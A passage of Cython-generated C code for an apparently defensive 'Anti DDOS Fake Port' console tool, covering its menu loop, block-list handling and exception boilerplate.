                                                __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
                                                __pyx_t_17 = NULL;
                                                if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
                                                    __pyx_t_17 = PyMethod_GET_SELF(__pyx_t_4);
                                                    if (likely(__pyx_t_17)) {
                                                        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
                                                        __Pyx_INCREF(__pyx_t_17);
                                                        __Pyx_INCREF(function);
                                                        __Pyx_DECREF_SET(__pyx_t_4, function);
                                                    }
                                                }
                                                __pyx_t_21 = (__pyx_t_17) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_17, __pyx_t_28) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_28);
                                                __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
                                                __Pyx_DECREF(__pyx_t_28); __pyx_t_28 = 0;
                                                if (unlikely(!__pyx_t_21)) __PYX_ERR(0, 295, __pyx_L151_error)
                                                    __Pyx_GOTREF(__pyx_t_21);
                                                __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                                                __Pyx_DECREF(__pyx_t_21); __pyx_t_21 = 0;
                                            }
                                            __Pyx_XDECREF(__pyx_t_19); __pyx_t_19 = 0;
                                            __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
                                            __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
                                            goto __pyx_L158_try_end;
                                        __pyx_L151_error:;
                                            __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
                                            __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
                                            __Pyx_XDECREF(__pyx_t_21); __pyx_t_21 = 0;
                                            __Pyx_XDECREF(__pyx_t_22); __pyx_t_22 = 0;
                                            __Pyx_XDECREF(__pyx_t_23); __pyx_t_23 = 0;
                                            __Pyx_XDECREF(__pyx_t_24); __pyx_t_24 = 0;
                                            __Pyx_XDECREF(__pyx_t_25); __pyx_t_25 = 0;
                                            __Pyx_XDECREF(__pyx_t_26); __pyx_t_26 = 0;
                                            __Pyx_XDECREF(__pyx_t_27); __pyx_t_27 = 0;
                                            __Pyx_XDECREF(__pyx_t_28); __pyx_t_28 = 0;
                                            __Pyx_XDECREF(__pyx_t_29); __pyx_t_29 = 0;
                                            __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0; {
                                                __Pyx_AddTraceback("anti", __pyx_clineno, __pyx_lineno, __pyx_filename);
                                                if (__Pyx_GetException(&__pyx_t_21, &__pyx_t_4, &__pyx_t_28) < 0) __PYX_ERR(0, 294, __pyx_L153_except_error)
                                                    __Pyx_GOTREF(__pyx_t_21);
                                                __Pyx_GOTREF(__pyx_t_4);
                                                __Pyx_GOTREF(__pyx_t_28);
                                                __pyx_t_17 = PyTuple_Pack(3, __pyx_t_21, __pyx_t_4, __pyx_t_28); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 294, __pyx_L153_except_error)
                                                    __Pyx_GOTREF(__pyx_t_17);
                                                __pyx_t_20 = __Pyx_PyObject_Call(__pyx_t_18, __pyx_t_17, NULL);
                                                __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
                                                __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
                                                if (unlikely(!__pyx_t_20)) __PYX_ERR(0, 294, __pyx_L153_except_error)
                                                    __Pyx_GOTREF(__pyx_t_20);
                                                __pyx_t_2 = __Pyx_PyObject_IsTrue(__pyx_t_20);
                                                __Pyx_DECREF(__pyx_t_20); __pyx_t_20 = 0;
                                                if (__pyx_t_2 < 0) __PYX_ERR(0, 294, __pyx_L153_except_error)
                                                    __pyx_t_13 = ((!(__pyx_t_2 != 0)) != 0);
                                                if (__pyx_t_13) {
                                                    __Pyx_GIVEREF(__pyx_t_21);
                                                    __Pyx_GIVEREF(__pyx_t_4);
                                                    __Pyx_XGIVEREF(__pyx_t_28);
                                                    __Pyx_ErrRestoreWithState(__pyx_t_21, __pyx_t_4, __pyx_t_28);
                                                    __pyx_t_21 = 0; __pyx_t_4 = 0; __pyx_t_28 = 0;
                                                    __PYX_ERR(0, 294, __pyx_L153_except_error)
                                                }
                                                __Pyx_XDECREF(__pyx_t_21); __pyx_t_21 = 0;
                                                __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
                                                __Pyx_XDECREF(__pyx_t_28); __pyx_t_28 = 0;
                                                goto __pyx_L152_exception_handled;
                                            }
                                        __pyx_L153_except_error:;
                                            __Pyx_XGIVEREF(__pyx_t_19);
                                            __Pyx_XGIVEREF(__pyx_t_7);
                                            __Pyx_XGIVEREF(__pyx_t_16);
                                            __Pyx_ExceptionReset(__pyx_t_19, __pyx_t_7, __pyx_t_16);
                                            goto __pyx_L89_except_error;
                                        __pyx_L152_exception_handled:;
                                            __Pyx_XGIVEREF(__pyx_t_19);
                                            __Pyx_XGIVEREF(__pyx_t_7);
                                            __Pyx_XGIVEREF(__pyx_t_16);
                                            __Pyx_ExceptionReset(__pyx_t_19, __pyx_t_7, __pyx_t_16);
                                        __pyx_L158_try_end:;
                                        }
                                    } { {
                                            if (__pyx_t_18) {
                                                __pyx_t_16 = __Pyx_PyObject_Call(__pyx_t_18, __pyx_tuple__6, NULL);
                                                __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
                                                if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 294, __pyx_L89_except_error)
                                                    __Pyx_GOTREF(__pyx_t_16);
                                                __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
                                            }
                                            goto __pyx_L150;
                                        }
                                    __pyx_L150:;
                                    }
                                    goto __pyx_L162;
                                __pyx_L145_error:;
                                    __Pyx_DECREF(__pyx_t_18); __pyx_t_18 = 0;
                                    goto __pyx_L89_except_error;
                                __pyx_L162:;
                                }
                                goto __pyx_L141_break;
                            }
                            __Pyx_GetModuleGlobalName(__pyx_t_28, __pyx_n_s_khanh); if (unlikely(!__pyx_t_28)) __PYX_ERR(0, 297, __pyx_L89_except_error)
                                __Pyx_GOTREF(__pyx_t_28);
                            __pyx_t_2 = (__Pyx_PyUnicode_Equals(__pyx_t_28, __pyx_n_u_N, Py_EQ)); if (unlikely(__pyx_t_2 < 0)) __PYX_ERR(0, 297, __pyx_L89_except_error)
                                __Pyx_DECREF(__pyx_t_28); __pyx_t_28 = 0;
                            if (!__pyx_t_2) {
                            }
                            else {
                                __pyx_t_13 = __pyx_t_2;
                                goto __pyx_L163_bool_binop_done;
                            }
                            __Pyx_GetModuleGlobalName(__pyx_t_28, __pyx_n_s_khanh); if (unlikely(!__pyx_t_28)) __PYX_ERR(0, 297, __pyx_L89_except_error)
                                __Pyx_GOTREF(__pyx_t_28);
                            __pyx_t_2 = (__Pyx_PyUnicode_Equals(__pyx_t_28, __pyx_n_u_n, Py_EQ)); if (unlikely(__pyx_t_2 < 0)) __PYX_ERR(0, 297, __pyx_L89_except_error)
                                __Pyx_DECREF(__pyx_t_28); __pyx_t_28 = 0;
                            __pyx_t_13 = __pyx_t_2;
                        __pyx_L163_bool_binop_done:;
                            if (__pyx_t_13) {
                                __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_remove); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 298, __pyx_L89_except_error)
                                    __Pyx_GOTREF(__pyx_t_4);
                                __pyx_t_21 = NULL;
                                if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
                                    __pyx_t_21 = PyMethod_GET_SELF(__pyx_t_4);
                                    if (likely(__pyx_t_21)) {
                                        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
                                        __Pyx_INCREF(__pyx_t_21);
                                        __Pyx_INCREF(function);
                                        __Pyx_DECREF_SET(__pyx_t_4, function);
                                    }
                                }
                                __pyx_t_28 = (__pyx_t_21) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_21, __pyx_kp_u_proxy_txt) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_kp_u_proxy_txt);
                                __Pyx_XDECREF(__pyx_t_21); __pyx_t_21 = 0;
                                if (unlikely(!__pyx_t_28)) __PYX_ERR(0, 298, __pyx_L89_except_error)
                                    __Pyx_GOTREF(__pyx_t_28);
                                __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                                __Pyx_DECREF(__pyx_t_28); __pyx_t_28 = 0;
                                goto __pyx_L141_break;
                            }
                        }
                    __pyx_L141_break:;
                        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
                        __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
                        __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
                        goto __pyx_L88_exception_handled;
                    }
                __pyx_L89_except_error:;
                    __Pyx_XGIVEREF(__pyx_t_6);
                    __Pyx_XGIVEREF(__pyx_t_15);
                    __Pyx_XGIVEREF(__pyx_t_8);
                    __Pyx_ExceptionReset(__pyx_t_6, __pyx_t_15, __pyx_t_8);
                    goto __pyx_L1_error;
                __pyx_L88_exception_handled:;
                    __Pyx_XGIVEREF(__pyx_t_6);
                    __Pyx_XGIVEREF(__pyx_t_15);
                    __Pyx_XGIVEREF(__pyx_t_8);
                    __Pyx_ExceptionReset(__pyx_t_6, __pyx_t_15, __pyx_t_8);
                __pyx_L92_try_end:;
                }
                __pyx_t_3 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__67, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 300, __pyx_L1_error)
                    __Pyx_GOTREF(__pyx_t_3);
                __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
                __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_blockk); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 301, __pyx_L1_error)
                    __Pyx_GOTREF(__pyx_t_3);
                if (likely(PyList_CheckExact(__pyx_t_3)) || PyTuple_CheckExact(__pyx_t_3)) {
                    __pyx_t_1 = __pyx_t_3; __Pyx_INCREF(__pyx_t_1); __pyx_t_14 = 0;
                    __pyx_t_10 = NULL;
                }
                else {
                    __pyx_t_14 = -1; __pyx_t_1 = PyObject_GetIter(__pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 301, __pyx_L1_error)
                        __Pyx_GOTREF(__pyx_t_1);
                    __pyx_t_10 = Py_TYPE(__pyx_t_1)->tp_iternext; if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 301, __pyx_L1_error)
                }
                __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
                for (;;) {
                    if (likely(!__pyx_t_10)) {
                        if (likely(PyList_CheckExact(__pyx_t_1))) {
                            if (__pyx_t_14 >= PyList_GET_SIZE(__pyx_t_1)) break;
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                            __pyx_t_3 = PyList_GET_ITEM(__pyx_t_1, __pyx_t_14); __Pyx_INCREF(__pyx_t_3); __pyx_t_14++; if (unlikely(0 < 0)) __PYX_ERR(0, 301, __pyx_L1_error)
#else
                            __pyx_t_3 = PySequence_ITEM(__pyx_t_1, __pyx_t_14); __pyx_t_14++; if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 301, __pyx_L1_error)
                                __Pyx_GOTREF(__pyx_t_3);
#endif
                        }
                        else {
                            if (__pyx_t_14 >= PyTuple_GET_SIZE(__pyx_t_1)) break;
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                            __pyx_t_3 = PyTuple_GET_ITEM(__pyx_t_1, __pyx_t_14); __Pyx_INCREF(__pyx_t_3); __pyx_t_14++; if (unlikely(0 < 0)) __PYX_ERR(0, 301, __pyx_L1_error)
#else
                            __pyx_t_3 = PySequence_ITEM(__pyx_t_1, __pyx_t_14); __pyx_t_14++; if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 301, __pyx_L1_error)
                                __Pyx_GOTREF(__pyx_t_3);
#endif
                        }
                    }
                    else {
                        __pyx_t_3 = __pyx_t_10(__pyx_t_1);
                        if (unlikely(!__pyx_t_3)) {
                            PyObject* exc_type = PyErr_Occurred();
                            if (exc_type) {
                                if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
                                else __PYX_ERR(0, 301, __pyx_L1_error)
                            }
                            break;
                        }
                        __Pyx_GOTREF(__pyx_t_3);
                    }
                    if (PyDict_SetItem(__pyx_d, __pyx_n_s__38, __pyx_t_3) < 0) __PYX_ERR(0, 301, __pyx_L1_error)
                        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
                    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_block); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 302, __pyx_L1_error)
                        __Pyx_GOTREF(__pyx_t_3);
                    __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s__38); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 302, __pyx_L1_error)
                        __Pyx_GOTREF(__pyx_t_5);
                    __pyx_t_28 = __Pyx_PyObject_CallOneArg(((PyObject*)(&PyUnicode_Type)), __pyx_t_5); if (unlikely(!__pyx_t_28)) __PYX_ERR(0, 302, __pyx_L1_error)
                        __Pyx_GOTREF(__pyx_t_28);
                    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
                    __pyx_t_33 = __Pyx_PyObject_Append(__pyx_t_3, __pyx_t_28); if (unlikely(__pyx_t_33 == ((int)-1))) __PYX_ERR(0, 302, __pyx_L1_error)
                        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
                    __Pyx_DECREF(__pyx_t_28); __pyx_t_28 = 0;
                }
                __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                if (__Pyx_PyObject_DelAttrStr(__pyx_m, __pyx_n_s_blockk) < 0) __PYX_ERR(0, 303, __pyx_L1_error)
            }
            __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_block); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 304, __pyx_L1_error)
                __Pyx_GOTREF(__pyx_t_1);
            __pyx_t_28 = PySet_New(__pyx_t_1); if (unlikely(!__pyx_t_28)) __PYX_ERR(0, 304, __pyx_L1_error)
                __Pyx_GOTREF(__pyx_t_28);
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
            __pyx_t_1 = PySequence_List(__pyx_t_28); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 304, __pyx_L1_error)
                __Pyx_GOTREF(__pyx_t_1);
            __Pyx_DECREF(__pyx_t_28); __pyx_t_28 = 0;
            if (PyDict_SetItem(__pyx_d, __pyx_n_s_block, __pyx_t_1) < 0) __PYX_ERR(0, 304, __pyx_L1_error)
                __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
            {
                __Pyx_PyThreadState_declare
                    __Pyx_PyThreadState_assign
                    __Pyx_ExceptionSave(&__pyx_t_8, &__pyx_t_15, &__pyx_t_6);
                __Pyx_XGOTREF(__pyx_t_8);
                __Pyx_XGOTREF(__pyx_t_15);
                __Pyx_XGOTREF(__pyx_t_6); {
                    while (1) {
                        __Pyx_GetModuleGlobalName(__pyx_t_28, __pyx_n_s_clear); if (unlikely(!__pyx_t_28)) __PYX_ERR(0, 307, __pyx_L167_error)
                            __Pyx_GOTREF(__pyx_t_28);
                        __pyx_t_3 = NULL;
                        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_28))) {
                            __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_28);
                            if (likely(__pyx_t_3)) {
                                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_28);
                                __Pyx_INCREF(__pyx_t_3);
                                __Pyx_INCREF(function);
                                __Pyx_DECREF_SET(__pyx_t_28, function);
                            }
                        }
                        __pyx_t_1 = (__pyx_t_3) ? __Pyx_PyObject_CallOneArg(__pyx_t_28, __pyx_t_3) : __Pyx_PyObject_CallNoArg(__pyx_t_28);
                        __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
                        if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 307, __pyx_L167_error)
                            __Pyx_GOTREF(__pyx_t_1);
                        __Pyx_DECREF(__pyx_t_28); __pyx_t_28 = 0;
                        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                        __pyx_t_28 = __Pyx_PyObject_GetAttrStr(__pyx_kp_u_1_Anti_DDOS_Fake_Port_0_2_Remov, __pyx_n_s_format); if (unlikely(!__pyx_t_28)) __PYX_ERR(0, 308, __pyx_L167_error)
                            __Pyx_GOTREF(__pyx_t_28);
                        __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_port_fake); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 308, __pyx_L167_error)
                            __Pyx_GOTREF(__pyx_t_3);
                        __pyx_t_5 = __Pyx_PyObject_CallOneArg(((PyObject*)(&PyUnicode_Type)), __pyx_t_3); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 308, __pyx_L167_error)
                            __Pyx_GOTREF(__pyx_t_5);
                        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
                        __pyx_t_3 = NULL;
                        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_28))) {
                            __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_28);
                            if (likely(__pyx_t_3)) {
                                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_28);
                                __Pyx_INCREF(__pyx_t_3);
                                __Pyx_INCREF(function);
                                __Pyx_DECREF_SET(__pyx_t_28, function);
                            }
                        }
                        __pyx_t_1 = (__pyx_t_3) ? __Pyx_PyObject_Call2Args(__pyx_t_28, __pyx_t_3, __pyx_t_5) : __Pyx_PyObject_CallOneArg(__pyx_t_28, __pyx_t_5);
                        __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
                        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
                        if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 308, __pyx_L167_error)
                            __Pyx_GOTREF(__pyx_t_1);
                        __Pyx_DECREF(__pyx_t_28); __pyx_t_28 = 0;
                        __pyx_t_28 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_1); if (unlikely(!__pyx_t_28)) __PYX_ERR(0, 308, __pyx_L167_error)
                            __Pyx_GOTREF(__pyx_t_28);
                        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                        __Pyx_DECREF(__pyx_t_28); __pyx_t_28 = 0;
                        __pyx_t_28 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__68, NULL); if (unlikely(!__pyx_t_28)) __PYX_ERR(0, 309, __pyx_L167_error)
                            __Pyx_GOTREF(__pyx_t_28);
                        __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject*)(&PyUnicode_Type)), __pyx_t_28); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 309, __pyx_L167_error)
                            __Pyx_GOTREF(__pyx_t_1);
                        __Pyx_DECREF(__pyx_t_28); __pyx_t_28 = 0;
                        if (PyDict_SetItem(__pyx_d, __pyx_n_s_khanh, __pyx_t_1) < 0) __PYX_ERR(0, 309, __pyx_L167_error)
                            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                        __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_khanh); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 310, __pyx_L167_error)
                            __Pyx_GOTREF(__pyx_t_1);
                        __pyx_t_13 = (__Pyx_PyUnicode_Equals(__pyx_t_1, __pyx_kp_u_1, Py_EQ)); if (unlikely(__pyx_t_13 < 0)) __PYX_ERR(0, 310, __pyx_L167_error)
                            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                        if (__pyx_t_13) {
                            __Pyx_GetModuleGlobalName(__pyx_t_28, __pyx_n_s_start); if (unlikely(!__pyx_t_28)) __PYX_ERR(0, 311, __pyx_L167_error)
                                __Pyx_GOTREF(__pyx_t_28);
                            __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_port_fake); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 311, __pyx_L167_error)
                                __Pyx_GOTREF(__pyx_t_5);
                            __pyx_t_3 = NULL;
                            if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_28))) {
                                __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_28);
                                if (likely(__pyx_t_3)) {
                                    PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_28);
                                    __Pyx_INCREF(__pyx_t_3);
                                    __Pyx_INCREF(function);
                                    __Pyx_DECREF_SET(__pyx_t_28, function);
                                }
                            }
                            __pyx_t_1 = (__pyx_t_3) ? __Pyx_PyObject_Call2Args(__pyx_t_28, __pyx_t_3, __pyx_t_5) : __Pyx_PyObject_CallOneArg(__pyx_t_28, __pyx_t_5);
                            __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
                            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
                            if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 311, __pyx_L167_error)
                                __Pyx_GOTREF(__pyx_t_1);
                            __Pyx_DECREF(__pyx_t_28); __pyx_t_28 = 0;
                            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                            goto __pyx_L175;
                        }
                        __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_khanh); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 312, __pyx_L167_error)
                            __Pyx_GOTREF(__pyx_t_1);
                        __pyx_t_13 = (__Pyx_PyUnicode_Equals(__pyx_t_1, __pyx_kp_u_2, Py_EQ)); if (unlikely(__pyx_t_13 < 0)) __PYX_ERR(0, 312, __pyx_L167_error)
                            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                        if (__pyx_t_13) {
                            __Pyx_GetModuleGlobalName(__pyx_t_28, __pyx_n_s_remove_block); if (unlikely(!__pyx_t_28)) __PYX_ERR(0, 313, __pyx_L167_error)
                                __Pyx_GOTREF(__pyx_t_28);
                            __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_port_fake); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 313, __pyx_L167_error)
                                __Pyx_GOTREF(__pyx_t_5);
                            __pyx_t_3 = NULL;
                            if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_28))) {
                                __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_28);
                                if (likely(__pyx_t_3)) {
                                    PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_28);
                                    __Pyx_INCREF(__pyx_t_3);
                                    __Pyx_INCREF(function);
                                    __Pyx_DECREF_SET(__pyx_t_28, function);
                                }
                            }
                            __pyx_t_1 = (__pyx_t_3) ? __Pyx_PyObject_Call2Args(__pyx_t_28, __pyx_t_3, __pyx_t_5) : __Pyx_PyObject_CallOneArg(__pyx_t_28, __pyx_t_5);
                            __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
                            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
                            if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 313, __pyx_L167_error)
                                __Pyx_GOTREF(__pyx_t_1);
                            __Pyx_DECREF(__pyx_t_28); __pyx_t_28 = 0;
                            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                            goto __pyx_L175;
                        }
                        __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_khanh); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 314, __pyx_L167_error)
                            __Pyx_GOTREF(__pyx_t_1);
                        __pyx_t_13 = (__Pyx_PyUnicode_Equals(__pyx_t_1, __pyx_kp_u_3, Py_EQ)); if (unlikely(__pyx_t_13 < 0)) __PYX_ERR(0, 314, __pyx_L167_error)
                            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                        if (__pyx_t_13) {
                            __Pyx_GetModuleGlobalName(__pyx_t_28, __pyx_n_s_about); if (unlikely(!__pyx_t_28)) __PYX_ERR(0, 315, __pyx_L167_error)
                                __Pyx_GOTREF(__pyx_t_28);
                            __pyx_t_5 = NULL;
                            if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_28))) {
                                __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_28);
                                if (likely(__pyx_t_5)) {
                                    PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_28);
                                    __Pyx_INCREF(__pyx_t_5);
                                    __Pyx_INCREF(function);
                                    __Pyx_DECREF_SET(__pyx_t_28, function);
                                }
                            }
                            __pyx_t_1 = (__pyx_t_5) ? __Pyx_PyObject_CallOneArg(__pyx_t_28, __pyx_t_5) : __Pyx_PyObject_CallNoArg(__pyx_t_28);
                            __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
                            if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 315, __pyx_L167_error)
                                __Pyx_GOTREF(__pyx_t_1);
                            __Pyx_DECREF(__pyx_t_28); __pyx_t_28 = 0;
                            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                            goto __pyx_L175;
                        }
                        __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_khanh); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 316, __pyx_L167_error)
                            __Pyx_GOTREF(__pyx_t_1);
                        __pyx_t_13 = (__Pyx_PyUnicode_Equals(__pyx_t_1, __pyx_kp_u_0, Py_EQ)); if (unlikely(__pyx_t_13 < 0)) __PYX_ERR(0, 316, __pyx_L167_error)
                            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                        if (__pyx_t_13) {
                            __Pyx_GetModuleGlobalName(__pyx_t_28, __pyx_n_s_kill_process); if (unlikely(!__pyx_t_28)) __PYX_ERR(0, 317, __pyx_L167_error)
                                __Pyx_GOTREF(__pyx_t_28);
                            __pyx_t_5 = NULL;
                            if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_28))) {
                                __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_28);
                                if (likely(__pyx_t_5)) {
                                    PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_28);
                                    __Pyx_INCREF(__pyx_t_5);
                                    __Pyx_INCREF(function);
                                    __Pyx_DECREF_SET(__pyx_t_28, function);
                                }
                            }
                            __pyx_t_1 = (__pyx_t_5) ? __Pyx_PyObject_CallOneArg(__pyx_t_28, __pyx_t_5) : __Pyx_PyObject_CallNoArg(__pyx_t_28);
                            __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
                            if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 317, __pyx_L167_error)
                                __Pyx_GOTREF(__pyx_t_1);
                            __Pyx_DECREF(__pyx_t_28); __pyx_t_28 = 0;
                            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                        }
                    __pyx_L175:;
                        goto __pyx_L173_continue;
                    __pyx_L173_continue:;
                    }
                }
                __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
                __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
                __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
                goto __pyx_L172_try_end;
            __pyx_L167_error:;
                __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
                __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
                __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
                __Pyx_XDECREF(__pyx_t_21); __pyx_t_21 = 0;
                __Pyx_XDECREF(__pyx_t_22); __pyx_t_22 = 0;
                __Pyx_XDECREF(__pyx_t_23); __pyx_t_23 = 0;
                __Pyx_XDECREF(__pyx_t_24); __pyx_t_24 = 0;
                __Pyx_XDECREF(__pyx_t_25); __pyx_t_25 = 0;
                __Pyx_XDECREF(__pyx_t_26); __pyx_t_26 = 0;
                __Pyx_XDECREF(__pyx_t_27); __pyx_t_27 = 0;
                __Pyx_XDECREF(__pyx_t_28); __pyx_t_28 = 0;
                __Pyx_XDECREF(__pyx_t_29); __pyx_t_29 = 0;
                __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
                __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
                __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
                __pyx_t_12 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_KeyboardInterrupt);
                if (__pyx_t_12) {
                    __Pyx_AddTraceback("anti", __pyx_clineno, __pyx_lineno, __pyx_filename);
                    if (__Pyx_GetException(&__pyx_t_1, &__pyx_t_28, &__pyx_t_5) < 0) __PYX_ERR(0, 319, __pyx_L169_except_error)
                        __Pyx_GOTREF(__pyx_t_1);
                    __Pyx_GOTREF(__pyx_t_28);
                    __Pyx_GOTREF(__pyx_t_5);
                    __pyx_t_3 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__27, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 320, __pyx_L169_except_error)
                        __Pyx_GOTREF(__pyx_t_3);
                    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
                    __pyx_t_3 = __Pyx_PyObject_CallNoArg(__pyx_builtin_input); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 321, __pyx_L169_except_error)
                        __Pyx_GOTREF(__pyx_t_3);
                    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
